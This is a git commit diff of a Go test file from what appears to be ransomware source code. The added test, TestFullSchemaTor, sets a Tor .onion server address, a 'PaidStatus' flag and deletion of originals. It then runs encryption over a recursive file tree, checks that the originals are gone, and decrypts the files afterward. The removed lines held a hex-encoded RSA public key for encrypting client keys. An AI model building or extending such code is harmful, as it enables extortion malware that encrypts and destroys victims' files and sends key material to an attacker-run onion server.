e19c1fb3f0549b8a860d8423a5838ea4b5026ac0
kula <kula124@gmail.com>
2021-06-23 12:08:54 +0200

    tor main test

--- src/main_test.go
+++ src/main_test.go
@@ -283,14 +283,44 @@ func TestOfflineDecryption(t *testing.T) {
 	tearDown()
 }
 
-/*func TestV3EncryptionScheme(t *testing.T) {
-	const test = "This is a test yay"
-	//	const sKey = "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
-	//	key, _ := hex.DecodeString(sKey)
-	const pubKey = `2D2D2D2D2D424547494E205055424C4943204B45592D2D2D2D2D0D0A4D494942496A414E42676B71686B6947397730424151454641414F43415138414D49494243674B4341514541316C76556C47453430616430596965594271776E0D0A5467333930354B76766B56715337396D4E413846736A6B70586E42616675527870673130635454696C396C78526A396A415A59455441334261355959367949660D0A79494D38504B42714D416230726F714B495A4579624C322F49395A3361456F4B567835456757536D776A6C6F764B526F30775A717173324C61563045365A44440D0A43727638677472794E6A4A4C474E3777715879657A326748525846537972765372586E34337276446B4637395937346F6C347770724D51376D7A6C447845752F0D0A342B31374675796436485542623743654D7079354F734647646D6D3750663349575A546B544B7754766C582B2B2B4274415357617350796F78672B33596F6E390D0A304872626D523762536D59642B59685151485854352B455A774F766175674E7369394D3575526C303941642F733439416C6A66785266496E4B6D2F3169394F670D0A6F774944415141420D0A2D2D2D2D2D454E44205055424C4943204B45592D2D2D2D2D0D0A`
-	pubPem, _ := hex.DecodeString(pubKey)
-	encryptedBytes, err := encryptClientPrivateKeyWithServerPublicKey([]byte(test), pubPem)
+func TestFullSchemaTor(t *testing.T) {
+	t.Skip()
+	var dQue utils.Queue
+	files, rootDir := createRecursiveFileHierarchy(t)
+	dQue.Init(files)
+	utils.Settings.Delete = true
+	utils.Settings.RawKey = false
+	utils.Settings.PaidStatus = true
+	utils.Settings.TorAddress = "http://xwjtp3mj427zdp4tljiiivg2l5ijfvmt5lcsfaygtpp6cw254kykvpyd.onion:88"
+	clientPrivateKey, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
-		log.Fatal((err))
+		log.Fatal(err)
 	}
-}*/
+	utils.Settings.SuppliedClientPrivateKey = clientPrivateKey
+	StartEncryption(&dQue, key)
+	for _, f := range files {
+		_, b := os.Stat(f)
+		if b == nil {
+			t.Errorf("Filed should be deleted")
+		}
+	}
+	var eQue utils.Queue
+	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
+	eQue.Init(eFiles)
+	// prepare decrypted key
+	StartDecryption(&eQue, key)
+	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
+	for _, ff := range files {
+		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
+			t.Error("Final array mismatch")
+		}
+		content, err := ioutil.ReadFile(ff)
+		if err != nil {
+			log.Fatal("Failed to read decrypted file")
+		}
+		if string(content) != "This is a test string" {
+			t.Error("Decrypted content mismatch")
+		}
+	}
+	tearDown()
+}
